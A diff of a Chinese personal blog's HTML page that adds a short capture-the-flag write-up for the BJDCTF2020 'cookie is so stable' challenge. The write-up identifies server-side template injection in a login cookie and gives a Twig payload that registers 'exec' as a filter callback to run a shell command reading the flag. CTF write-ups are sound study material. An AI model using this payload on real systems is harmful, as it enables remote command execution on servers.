@@ -156,6 +156,75 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://octopus-brooo.github.io/2021/07/16/CTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_bt%2F0%2F13223991311%2F1000&refer=http%3A%2F%2Finews.gtimg.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1628928275&t=77efab54abacdc9dc3a45b021a644739">
+      <meta itemprop="name" content="octopus">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Octopus's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/07/16/CTF/" class="post-title-link" itemprop="url">BJDCTF2020 cookie Is so stable</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-07-16 14:56:52 / 修改时间：15:04:17" itemprop="dateCreated datePublished" datetime="2021-07-16T14:56:52+08:00">2021-07-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMwODQ5Ny1lNGE3ODBkNjdjZWNiNjk4LnBuZw?x-oss-process=image/format,png" alt="图片.png"></p>
+<p>Flag和Hint两个页面抓包，flag页面告诉我们要先登录，hint页面告诉我们要在cookie里面做文章</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMwODQ5Ny0wYzkwNDFhZTc2NzY2MzY2LnBuZw?x-oss-process=image/format,png" alt="图片.png"></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMwODQ5Ny0wZWY2MTkyNGZlYWQwYTIzLnBuZw?x-oss-process=image/format,png" alt="图片.png"></p>
+<p>flag页面先登录然后抓包，发现cookie里面出现<code>user</code>。尝试多次后，发现是ssti注入</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMwODQ5Ny0zNWVhODg3MmQzOTVjODkyLnBuZw?x-oss-process=image/format,png" alt="图片.png"></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMwODQ5Ny04MjRlOWViOTRjMTdlNWJiLnBuZw?x-oss-process=image/format,png" alt="图片.png"></p>
+<blockquote>
+<p>3.打入payload。<br><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p>
+</blockquote>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMwODQ5Ny00NzY4MWI4ODE1Yjg0ZTMxLnBuZw?x-oss-process=image/format,png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://octopus-brooo.github.io/2021/07/15/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -347,7 +416,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
